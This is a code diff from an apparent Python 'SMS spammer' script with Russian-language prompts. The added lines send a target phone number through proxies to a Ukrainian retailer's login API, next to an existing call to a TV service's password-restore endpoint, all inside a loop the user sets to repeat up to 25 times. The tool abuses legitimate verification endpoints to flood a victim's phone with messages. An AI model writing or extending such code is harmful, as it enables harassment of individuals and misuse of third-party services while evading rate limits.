@@ -51,6 +51,11 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
+     requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
+     print('my.ctrs.com')
+ except:
+     print('Не отправлено my.ctrs.com')
+ try:
      requests.post('https://my.xtra.tv/api/password/restore?lang=uk', data={'phone': "+" + number}, headers=headers, proxies=proxies)
      print('xtra.tv-pass')
  except:
